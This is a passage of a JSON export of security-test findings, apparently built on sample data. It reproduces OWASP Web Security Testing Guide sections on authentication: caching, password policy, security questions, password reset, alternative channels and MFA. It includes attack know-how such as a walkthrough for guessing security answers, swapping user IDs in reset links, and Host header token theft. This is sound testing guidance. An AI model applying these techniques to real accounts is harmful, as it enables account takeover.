\u0060C:\\Users\\\u003Cuser_name\u003E\\AppData\\Local\\Mozilla\\Firefox\\Profiles\\\u003Cprofile-id\u003E\\Cache2\\\u0060\n* Internet Explorer:\n    * \u0060C:\\Users\\\u003Cuser_name\u003E\\AppData\\Local\\Microsoft\\Windows\\INetCache\\\u0060\n* Chrome:\n    * Windows: \u0060C:\\Users\\\u003Cuser_name\u003E\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache\u0060\n    * Unix/Linux: \u0060~/.cache/google-chrome\u0060\n\n#### Reviewing Cached Information\n\nFirefox provides functionality for viewing cached information, which may be to your benefit as a tester. Of course the industry has also produced various extensions, and external apps which you may prefer or need for Chrome, Internet Explorer, or Edge.\nCache details are also available via developer tools in most modern browsers, such as [Firefox](https://developer.mozilla.org/en-US/docs/Tools/Storage_Inspector#Cache_Storage), [Chrome](https://developers.google.com/web/tools/chrome-devtools/storage/cache), and Edge. With Firefox it is also possible to use the URL \u0060about:cache\u0060 to check cache details.\n\n#### Check Handling for Mobile Browsers\n\nHandling of cache directives may be completely different for mobile browsers. Therefore, testers should start a new browsing session with clean caches and take advantage of features like Chrome\u2019s [Device Mode](https://developers.google.com/web/tools/chrome-devtools/device-mode) or Firefox\u2019s [Responsive Design Mode](https://developer.mozilla.org/en-US/docs/Tools/Responsive_Design_Mode) to re-test or separately test the concepts outlined above.\nAdditionally, personal proxies such as ZAP and Burp Suite allow the tester to specify which \u0060User-Agent\u0060 should be sent by their spiders/crawlers. This could be set to match a mobile browser \u0060User-Agent\u0060 string and used to see which caching directives are sent by the application being tested.\n\n### Gray-Box Testing\n\nThe methodology for testing is equivalent to the black-box case, as in both scenarios testers have full access to the server response headers and to the HTML code. However, with gray-box testing, the tester may have access to account credentials that will allow them to test sensitive pages that are accessible only to authenticated users.\n\n## Tools\n\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n\n\n","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n### Whitepapers\n\n* [Caching in HTTP](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-07 Testing for Weak Password Policy","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nThe most prevalent and most easily administered authentication mechanism is a static password. The password represents the keys to the kingdom, but is often subverted by users in the name of usability. In each of the recent high profile hacks that have revealed user credentials, it is lamented that most common passwords are still: \u0060123456\u0060, \u0060password\u0060 and \u0060qwerty\u0060.","TestingInstructions":"## Test Objectives\n\n* Determine the resistance of the application against brute force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.\n\n## How to Test\n\n1. What characters are permitted and forbidden for use within a password? Is the user required to use characters from different character sets such as lower and uppercase letters, digits and special symbols?\n2. How often can a user change their password? How quickly can a user change their password after a previous change? Users may bypass password history requirements by changing their password 5 times in a row so that after the last password change they have configured their initial password again.\n3. When must a user change their password?\n    * Both [NIST](https://pages.nist.gov/800-63-3/sp800-63b.html#memsecretver) and [NCSC](https://www.ncsc.gov.uk/collection/passwords/updating-your-approach#PasswordGuidance:UpdatingYourApproach-Don\u0027tenforceregularpasswordexpiry) recommend **against** forcing regular password expiry, although it may be required by standards such as PCI DSS.\n4. How often can a user reuse a password? Does the application maintain a history of the user\u2019s previous used 8 passwords?\n5. How different must the next password be from the last password?\n6. Is the user prevented from using his username or other account information (such as first or last name) in the password?\n7. What are the minimum and maximum password lengths that can be set, and are they appropriate for the sensitivity of the account and application?\n8. Is it possible to set common passwords such as \u0060Password1\u0060 or \u0060123456\u0060?","Details":null,"Implication":null,"Recommendation":"## Remediation\n\nTo mitigate the risk of easily guessed passwords facilitating unauthorized access there are two solutions: introduce additional authentication controls (i.e. two-factor authentication) or introduce a strong password policy. The simplest and cheapest of these is the introduction of a strong password policy that ensures password length, complexity, reuse and aging; although ideally both of them should be implemented.","References":"## References\n\n* [Brute Force Attacks](https://owasp.org/www-community/attacks/Brute_force_attack)\n\n1. \n\n\n\u003Cbr\u003E\n","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-08 Testing for Weak Security Question Answer","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nOften called \u201Csecret\u201D questions and answers, security questions and answers are often used to recover forgotten passwords (see [Testing for weak password change or reset functionalities](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities), or as extra security on top of the password.\nThey are typically generated upon account creation and require the user to select from some pre-generated questions and supply an appropriate answer. They may allow the user to generate their own question and answer pairs. Both methods are prone to insecurities. Ideally, security questions should generate answers that are only known by the user, and not guessable or discoverable by anybody else. This is harder than it sounds. Security questions and answers rely on the secrecy of the answer. Questions and answers should be chosen so that the answers are only known by the account holder. However, although a lot of answers may not be publicly known, most of the questions that sites implement promote answers that are pseudo-private.\n\n### Pre-generated Questions\n\nThe majority of pre-generated questions are fairly simplistic in nature and can lead to insecure answers. For example:\n\n* The answers may be known to family members or close friends of the user, e.g. \u201CWhat is your mother\u2019s maiden name?\u201D, \u201CWhat is your date of birth?\u201D\n* The answers may be easily guessable, e.g. \u201CWhat is your favorite color?\u201D, \u201CWhat is your favorite baseball team?\u201D\n* The answers may be brute forcible, e.g. \u201CWhat is the first name of your favorite high school teacher?\u201D - the answer is probably on some easily downloadable lists of popular first names, and therefore a simple brute force attack can be scripted.\n* The answers may be publicly discoverable, e.g. \u201CWhat is your favorite movie?\u201D - the answer may easily be found on the user\u2019s social media profile page.\n\n### Self-generated Questions\n\nThe problem with having users to generate their own questions is that it allows them to generate very insecure questions, or even bypass the whole point of having a security question in the first place. Here are some real world examples that illustrate this point:\n\n* \u201CWhat is 1\u002B1?\u201D\n* \u201CWhat is your username?\u201D\n* \u201CMy password is S3curIty!\u201D","TestingInstructions":"## Test Objectives\n\n* Determine the complexity and how straight-forward the questions are.\n* Assess possible user answers and brute force capabilities.\n\n## How to Test\n\n### Testing for Weak Pre-generated Questions\n\nTry to obtain a list of security questions by creating a new account or by following the \u201CI don\u2019t remember my password\u201D-process. Try to generate as many questions as possible to get a good idea of the type of security questions that are asked. If any of the security questions fall in the categories described above, they are vulnerable to being attacked (guessed, brute-forced, available on social media, etc.).\n\n### Testing for Weak Self-Generated Questions\n\nTry to create security questions by creating a new account or by configuring your existing account\u2019s password recovery properties. If the system allows the user to generate their own security questions, it is vulnerable to having insecure questions created. If the system uses the self-generated security questions during the forgotten password functionality and if usernames can be enumerated (see [Testing for Account Enumeration and Guessable User Account](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account), then it should be easy for the tester to enumerate a number of self-generated questions. It should be expected to find several weak self-generated questions using this method.\n\n### Testing for Brute-forcible Answers\n\nUse the methods described in [Testing for Weak lock out mechanism](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism) to determine if a number of incorrectly supplied security answers trigger a lockout mechanism.\nThe first thing to take into consideration when trying to exploit security questions is the number of questions that need to be answered. The majority of applications only need the user to answer a single question, whereas some critical applications may require the user to answer two or even more questions.\nThe next step is to assess the strength of the security questions. Could the answers be obtained by a simple Google search or with social engineering attack? As a penetration tester, here is a step-by-step walkthrough of exploiting a security question scheme:\n\n* Does the application allow the end user to choose the question that needs to be answered? If so, focus on questions which have:\n    * A \u201Cpublic\u201D answer; for example, something that could be find with a simple search-engine query.\n    * A factual answer such as a \u201Cfirst school\u201D or other facts which can be looked up.\n    * Few possible answers, such as \u201Cwhat model was your first car\u201D. These questions would present the attacker with a short list of possible answers, and based on statistics the attacker could rank answers from most to least likely.\n* Determine how many guesses you have if possible.\n    * Does the password reset allow unlimited attempts?\n    * Is there a lockout period after X incorrect answers? Keep in mind that a lockout system can be a security problem in itself, as it can be exploited by an attacker to launch a Denial of Service against legitimate users.\n    * Pick the appropriate question based on analysis from the above points, and do research to determine the most likely answers.\n\nThe key to successfully exploiting and bypassing a weak security question scheme is to find a question or set of questions which give the possibility of easily finding the answers. Always look for questions which can give you the greatest statistical chance of guessing the correct answer, if you are completely unsure of any of the answers. In the end, a security question scheme is only as strong as the weakest question.","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [The Curse of the Secret Question](https://www.schneier.com/essay-081.html)\n* [The OWASP Security Questions Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-09 Testing for Weak Password Change or Reset Functionalities","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nFor any application that requires the user to authenticate with a password, there must be a mechanism by which the user can regain access to their account if they forget their password. Although this can sometimes be a manual process that involves contacting the owner of the website or a support team, users are frequently allowed to carry out a self-service password reset, and to regain access to their account by providing some other evidence of their identity.\nAs this functionality provides a direct route to compromise the user\u2019s account, it is crucial that it is implemented securely.","TestingInstructions":null,"Details":"## Test Objectives\n\n* Determine whether the password change and reset functionality allows accounts to be compromised.\n\n## How to Test\n\n### Information Gathering\n\nThe first step is to gather information about what mechanisms are available to allow the user to reset their password on the application. If there are multiple interfaces on the same site (such as a web interface, mobile application, and API) then these should all be reviewed, in case they provide different functionality.\nOnce this has been established, determine what information is required in order for a user to initiate a password reset. This can be the username or email address (both of which may be obtained from public information), but it could also be an internally-generated user ID.\n\n### General Concerns\n\nRegardless of the specific methods used to reset passwords, there are a number of common areas that need to be considered:\n\n* Is the password reset process weaker than the authentication process?\n    The password reset process provides an alternative mechanism to access a user\u2019s account, and so should be at least as secure as the usual authentication process. However, it can provide an easier way to compromise the account, especially if it uses weaker authentication factors such as security questions.\n    Additionally, the password reset process may bypass the requirement to use Multi-Factor Authentication (MFA), which can substantially reduce the security of the application.\n* Is there rate limiting or other protection against automated attacks?\n    As with any authentication mechanism, the password reset process should have protection against automated or brute-force attacks. There are a variety of different methods that can be used to achieve this, such as rate limiting or the use of CAPTCHA. These are particularly important on functionality that triggers external actions (such as sending an email or SMS), or when the user is entering a password reset token.\n    It is also possible to protect against brute-force attacks by locking out the account from the password reset process after a certain number of consecutive attempts. This could also prevent a legitimate user from being able to reset their password and regain access to their account, however.\n* Is it vulnerable to common attacks?\n    As well as the specific areas discussed in this guide, it\u2019s also important to check for other common vulnerabilities such as SQL injection or cross-site scripting.\n* Does the reset process allow user enumeration?\n    See the [Testing for Account Enumeration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account) guide for further information.\n\n### Email - New Password Sent\n\nIn this model, the user is sent a new password via email once they have proved their identity. This is considered less secure for two main reasons:\n\n* The password is sent to the user in an unencrypted form.\n* The password for the account is changed when the request is made, effectively locking the user out of their account until they receive the email. By making repeated requests, it is possible to prevent a user from being able to access their account.\n\nWhere this approach is used, the following areas should be reviewed:\n\n* Is the user forced to change the password on initial login?\n    The new password is sent over unencrypted email, and may sit in the user\u2019s inbox indefinitely if they don\u2019t delete the email. As such, the user should be required to change the password as soon as they log in for the first time.\n* Is the password securely generated?\n    The password should be generated using a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long to prevent password guessing or brute-force attacks. For a secure user-friendly experience, it should be generated using a secure passphrase-style approach (i.e, combining multiple words), rather than a string of random characters.\n* Is the user\u2019s existing password sent to them?\n    Rather than generating a new password for the user, some applications will send the user their existing password. This is a very insecure approach, as it exposes their current password over unencrypted email. Additionally, if the site is able to recover the existing password, this implies that passwords are either stored using reversible encryption, or (more likely) in unencrypted plain text, both of which represent a serious security weakness.\n* Are the emails sent from a domain with anti-spoofing protection?\n    The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.\n* Is email considered sufficiently secure?\n    Emails are typically sent unencrypted, and in many cases the user\u2019s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.\n    Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.\n\n### Email - Link Sent\n\nIn this model, the user is emailed a link that contains a token. They can then click this link, and are prompted to enter a new password on the site. This is the most common approach used for password reset, but is more complex to implement than the previously discussed approach. The key areas to test are:\n\n* Does the link use HTTPS?\n    If the token is sent over unencrypted HTTP, it may be possible for an attacker to intercept it.\n* Can the link be used multiple times?\n    Links should expire after they are used, otherwise they provide a persistent backdoor for the account.\n* Does the link expire if it remains unused?\n    Links should be time limited. Exactly how long is appropriate will depend on the site, but it should rarely be more than an hour.\n* Is the token sufficiently long and random?\n    The security of the process is entirely reliant on an attacker not being able to guess or brute-force a token. The tokens should be generated with a Cryptographically Secure Pseudo-Random Number Generator (CSPRNG), and should be sufficiently long that it is impractical for an attacker to guess or brute-force. At least 128 bits (or 32 hex characters) is a sufficient minimum to make such an online attack impractical.\n    Tokens should never be generated based on known values, such as by taking the MD5 hash of the user\u2019s email with \u0060md5($email)\u0060, or using GUIDs which may use insecure PRNG functions, or may not even be random depending on the type.\n    An alternative approach to random tokens is to use a cryptographically signed token such as a JWT. In this case, the usual JWT checks should be carried out (is the signature verified, can the \u201CnONe\u201D algorithm be used, can the HMAC key be brute-forced, etc). See the [Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens) guide for further information.\n* Does the link contain a user ID?\n    Sometimes the password reset link may include a user ID as well as a token, such as \u0060reset.php?userid=1\u0026token=123456\u0060. In this case, it may be possible to modify the \u0060userid\u0060 parameter to reset other users\u2019 passwords.\n* Can you inject a different host header?\n    If the application trusts the value of the \u0060Host\u0060 header and uses this to generate the password reset link, it may be possible to steal tokens by injecting a modified \u0060Host\u0060 header into the request. See the [Testing for Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection) guide for further information.\n* Is the link exposed to third parties?\n    If the page that the user is taken to includes content from other parties (such as loading scripts from other domains), then the reset token in the URL may be exposed in the HTTP \u0060Referer\u0060 header sent in these requests. The \u0060Referrer-Policy\u0060 HTTP header can be used to protect against this, so check if one is defined for the page.\n    Additionally, if the page includes any tracking, analytics or advertising scripts, the token will also be exposed to them.\n* Are the emails sent from a domain with anti-spoofing protection?\n    The domain should implement SPF, DKIM, and DMARC to prevent attackers from spoofing emails from it, which could be used as part of a social engineering attack.\n* Is email considered sufficiently secure?\n    Emails are typically sent unencrypted, and in many cases the user\u2019s email account will not be protected by MFA. It may also be shared between multiple individuals, particularly in a corporate environment.\n    Consider whether email-based password reset functionality is appropriate, based on the context of the application that is being tested.\n\n### Tokens Sent Over SMS or Phone Call\n\nRather than sending a token in an email, an alternative approach is to send it via SMS or an automated phone call, which the user will then enter on the application. The key areas to test are:\n\n* Is the token sufficiently long and random?\n    Tokens sent this way are typically shorter, as they are intended to be manually typed by the user, rather than being embedded in a link. It\u2019s fairly common for applications to use six numeric digits, which only provides \\~20 bits of security (feasible for an online brute-force attack), rather than the typically longer email token.\n    This makes it much more important that the password reset functionality is protected against brute-force attacks.\n* Can the token be used multiple times?\n    Tokens should be invalidated after they are used, otherwise they provide a persistent backdoor for the account.\n* Does the token expire if it remains unused?\n    As the shorter tokens are more susceptible to brute-force attacks, a shorter expiration time should be implemented to limit the window available for an attacker to carry out an attack.\n* Are appropriate rate limiting and restrictions in place?\n    Sending an SMS or triggering an automated phone call to a user is significantly more disruptive than sending an email, and could be used to harass a user, or even carry out a denial of service attack against their phone. The application should implement rate limiting to prevent this.\n    Additionally, SMS messages and phone calls often incur financial costs for the sending party. If an attacker is able to cause a large number of messages to be sent, this could result in significant costs for the website operator. This is especially true if they are sent to international or premium rate numbers. However, allowing international numbers may be a requirement of the application.\n* Is SMS or a phone call considered sufficiently secure?\n    [A variety of attacks](https://www.ncsc.gov.uk/guidance/protecting-sms-messages-used-in-critical-business-processes#section_4) have been demonstrated that would allow an attacker to effectively hijack SMS messages, there are conflicting views about whether SMS is sufficiently secure to be used as an authentication factor.\n    It is usually possible to answer an automated phone call with physical access to a device, without needing any kind of PIN or fingerprint to unlock the phone. In some circumstances (such as a shared office environment), this could allow an internal attacker to trivially reset another user\u2019s password by walking over to their desk when they are out of office.\n    Consider whether SMS or automated phone calls are appropriate, based on the context of the application that is being tested.\n\n### Security Questions\n\nRather than sending them a link or new password, security questions can be used as a mechanism to authenticate the user. This is considered to be a weak approach, and should not be used if better options are available.\nSee the [Testing for Weak Security Questions](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer) guide for further information.\n\n### Authenticated Password Changes\n\nOnce the user has proved their identity (either through a password reset link, a recovery code, or by logging in on the application) they should be able to change their password. The key area to test are:\n\n* When setting the password, can you specify the user ID?\n    If the user ID is included in the password reset request and is not validated, it may be possible to modify it and change other users\u2019 passwords.\n* Is the user required to re-authenticate?\n    If a logged-in user tries to change their password, they should be asked to re-authenticate with their current password in order to protect against an attacker gaining temporary access to an unattended session. If the user has MFA enabled, then they would typically re-authenticate with that, rather than their password.\n* Is the password change form vulnerable to CSRF?\n    If the user isn\u2019t required to re-authenticate, then it may be possible to carry out a CSRF attack against the password reset form, allowing their account to be compromised. See the [Testing for Cross-Site Request Forgery](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery) guide for further information.\n* Is a strong and effective password policy applied?\n    The password policy should be consistent across the registration, password change, and password reset functionality. See the [Testing for Weak Password Policy](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy) guide for further information.\n\n\n\u003Cbr\u003E\n","Implication":null,"Recommendation":null,"References":"## References\n\n* [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1"}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-10 Testing for Weaker Authentication in Alternative Channel","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nEven if the primary authentication mechanisms do not include any vulnerabilities, it may be that vulnerabilities exist in alternative legitimate authentication user channels for the same user accounts. Tests should be undertaken to identify alternative channels and, subject to test scoping, identify vulnerabilities.\nThe alternative user interaction channels could be utilized to circumvent the primary channel, or expose information that can then be used to assist an attack against the primary channel. Some of these channels may themselves be separate web applications using different hostnames or paths. For example:\n\n* Standard website\n* Mobile, or specific device, optimized website\n* Accessibility optimized website\n* Alternative country and language websites\n* Parallel websites that utilize the same user accounts (e.g. another website offering different functionally of the same organization, a partner website with which user accounts are shared)\n* Development, test, UAT and staging versions of the standard website\n\nBut they could also be other types of application or business processes:\n\n* Mobile device app\n* Desktop application\n* Call center operators\n* Interactive voice response or phone tree systems\n\nNote that the focus of this test is on alternative channels; some authentication alternatives might appear as different content delivered via the same website and would almost certainly be in scope for testing. These are not discussed further here, and should have been identified during information gathering and primary authentication testing. For example:\n\n* Progressive enrichment and graceful degradation that change functionality\n* Site use without cookies\n* Site use without JavaScript\n* Site use without plugins such as for Flash and Java\n\nEven if the scope of the test does not allow the alternative channels to be tested, their existence should be documented. These may undermine the degree of assurance in the authentication mechanisms and may be a precursor to additional testing.\n\n## Example\n\nThe primary website is \u0060http://www.example.com\u0060 and authentication functions always take place on pages using TLS \u0060https://www.example.com/myaccount/\u0060.\nHowever, a separate mobile-optimized website exists that does not use TLS at all, and has a weaker password recovery mechanism \u0060http://m.example.com/myaccount/\u0060.","TestingInstructions":null,"Details":"## Test Objectives\n\n* Identify alternative authentication channels.\n* Assess the security measures used and if any bypasses exists on the alternative channels.\n\n## How to Test\n\n### Understand the Primary Mechanism\n\nFully test the website\u2019s primary authentication functions. This should identify how accounts are issued, created or changed and how passwords are recovered, reset, or changed. Additionally knowledge of any elevated privilege authentication and authentication protection measures should be known. These precursors are necessary to be able to compare with any alternative channels.\n\n### Identify Other Channels\n\nOther channels can be found by using the following methods:\n\n* Reading site content, especially the home page, contact us, help pages, support articles and FAQs, T\u0026Cs, privacy notices, the robots.txt file and any sitemap.xml files.\n* Searching HTTP proxy logs, recorded during previous information gathering and testing, for strings such as \u201Cmobile\u201D, \u201Candroid\u201D, blackberry\u201D, \u201Cipad\u201D, \u201Ciphone\u201D, \u201Cmobile app\u201D, \u201Ce-reader\u201D, \u201Cwireless\u201D, \u201Cauth\u201D, \u201Csso\u201D, \u201Csingle sign on\u201D in URL paths and body content.\n* Use search engines to find different websites from the same organization, or using the same domain name, that have similar home page content or which also have authentication mechanisms.\n\nFor each possible channel confirm whether user accounts are shared across these, or provide access to the same or similar functionality.\n\n### Enumerate Authentication Functionality\n\nFor each alternative channel where user accounts or functionality are shared, identify if all the authentication functions of the primary channel are available, and if anything extra exists. It may be useful to create a grid like the one below:\n\n| Primary | Mobile | Call Center | Partner Website |\n| ------- | ------ | ----------- | --------------- |\n| Register | Yes | - | - |\n| Log in | Yes | Yes | Yes(SSO) |\n| Log out | - | - | - |\n| Password reset | Yes | Yes | - |\n| - | Change password | - | - |\n\nIn this example, mobile has an extra function \u201Cchange password\u201D but does not offer \u201Clog out\u201D. A limited number of tasks are also possible by phoning the call center. Call centers can be interesting, because their identity confirmation checks might be weaker than the website\u2019s, allowing this channel to be used to aid an attack against a user\u2019s account.\nWhile enumerating these it is worth taking note of how session management is undertaken, in case there is overlap across any channels (e.g. cookies scoped to the same parent domain name, concurrent sessions allowed across channels, but not on the same channel).\n\n### Review and Test\n\nAlternative channels should be mentioned in the testing report, even if they are marked as \u201Cinformation only\u201D or \u201Cout of scope\u201D. In some cases the test scope might include the alternative channel (e.g. because it is just another path on the target host name), or may be added to the scope after discussion with the owners of all the channels. If testing is permitted and authorized, all the other authentication tests in this guide should then be performed, and compared against the primary channel.\n\n## Related Test Cases\n\nThe test cases for all the other authentication tests should be utilized.\n\n\u003Cbr\u003E\n","Implication":null,"Recommendation":"## Remediation\n\nEnsure a consistent authentication policy is applied across all channels so that they are equally secure.\n\n1. \n\n\n\u003Cbr\u003E\n","References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/13/2024","hours_to_find":"1"}},"Asset":{"AppVersion":"3.0.1","Name":"04-Authentication Testing","Description":"04-Authentication Testing","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"b355d846-8a1f-4935-bcda-1f233dc5fe2e","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-ATHN-11 Testing Multi-Factor Authentication (MFA) ID WSTG-ATHN-11","Severity":"High","FoundDate":"2024-06-13T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nMany applications implement Multi-Factor Authentication (MFA) as an additional layer of security to protect the login process. This is also known as two-factor authentication (2FA) or two-step verification (2SV) - although these are not strictly the same thing. MFA means asking the user to provide *at least* two different [authentication 